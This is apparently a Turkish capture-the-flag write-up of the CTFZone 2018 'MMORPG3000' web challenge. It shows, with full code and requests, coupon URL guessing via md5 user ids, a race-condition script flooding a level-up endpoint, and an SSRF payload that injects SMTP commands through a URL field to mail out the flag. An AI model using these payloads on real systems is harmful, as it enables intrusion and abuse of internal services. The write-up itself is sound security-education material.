# MMORPG3000 - CTFZone 2018

```
Here is a new generation mmorpg game, where you can beat your friends, just finished crowdfunding campaign and available on your PC starting today. It's a bit buggy, but you know...
I heard that developers of this game are really greedy.

http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/game/battle/competitors/
```

Verilen linke tikladigimizda assagidaki sayfa goruluyor.

![](1.png)
Sunulan bedava kuponu almak uzere donate sayfasini gittik.

![](2.png)

Verilen hediye kuponu girdikten sonra assagidaki resim ile karsilastik.

![](3.png)

Resimin __URL__'si şu şekilde;

``` 
http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_aa2a77371374094fe9e0bc1de3f94ed9.png
```

__coupon_aa2a77371374094fe9e0bc1de3f94ed9__ urlin suffixi userid'in md5li hali oldugunu farkettik ve baska bir sayinin md5'ini alip denedik.


```
http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_6a81681a7af700c6385d36577ebec359.png
```

![](4.png)

Kuponlar ile level atlattik fakat level 30'un otesine kuponlar ile gecilmiyormus. Bir umit __Race Condition__ vardir diye umit ettik ve denedik.

![](5.png)

```python
import asyncio
from aiohttp import ClientSession

async def fetch(url, session):
    async with session.get(url) as response:
        return await response.read()

async def run(n):
    sem = asyncio.Semaphore(n)
    async with ClientSession(cookies={"session": "eyJ1aWQiOjgyOX0.DjeKvA.qA-vNIHjDFSPyuDwArZyGMQD984"}) as session:
        await asyncio.gather(*(asyncio.ensure_future(fetch("http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one:80/donate/lvlup", session)) for _ in range(n)))

number = 10000
loop = asyncio.get_event_loop()

future = asyncio.ensure_future(run(number))
loop.run_until_complete(future)
```

Ve 30'uncu leveli geçtik

![](6.png)

30'uncu leveli gectigimizden dolayı __Avatar__ ekleme ozelligi aktif olmus oldu.

![](7.png)

Upload fonksiyonunda bir sey yoktu. Belki  __SSRF__'tir. __127.0.0.1__ ve __localhost__ engelliydi bu yüzden __SSRF__ olgundan emin olduk. Ama __0.0.0.0__ adresi calisiyordu. Port taramaya basladik.

![](8.png)

__25__'ci port yani __SMTP__ portu acikmis. __Host__'u manipüle ederek __SMTP__'yi kullanmayı denedik.

```smtp
Host: [0.0.0.0
helo 1v3m
mail from:<qaewjlfnwej@o3enzyme.com>
rcpt to:<root>
data
subject: give me flag

1v3m
.
]:25
```

Yeni satır ayıracı __SMTP__'de delimiter olduğu için her satırın sonuna yeni satırın __URL Encoded__ hali olan __%0A__'yı ekledik ve son payloadımızın son hali 

```url
[0.0.0.0%0ahelo 1v3m%0amail from:<qaewjlfnwej@o3enzyme.com>%0arcpt to:<root>%0adata%0asubject: give me flag%0a%0a1v3m%0a.%0a]:25
```

__Request__'imizin son hali şöyle oldu:

```http
POST /user/avatar HTTP/1.1
Host: web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar
Content-Type: multipart/form-data; boundary=---------------------------4693211868403427471435307016
Content-Length: 581
Cookie: session=eyJ1aWQiOjgyN30.DjaSgA.ylhJXkstamQ7GahYWvUypKpvDQc
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------4693211868403427471435307016
Content-Disposition: form-data; name="avatar"; filename=""
Content-Type: application/octet-stream


-----------------------------4693211868403427471435307016
Content-Disposition: form-data; name="url"

https://[0.0.0.0%0ahelo 1v3m%0amail from:<qaewjlfnwej@o3enzyme.com>%0arcpt to:<root>%0adata%0asubject: give me flag%0a%0a1v3m%0a.%0a]:25
-----------------------------4693211868403427471435307016
Content-Disposition: form-data; name="action"

save
-----------------------------4693211868403427471435307016--

```
Flag mailimize geldi

![](9.png)

ve flag

```
ctfzone{1640392aaf27597150c97e04a99a6f08}
```
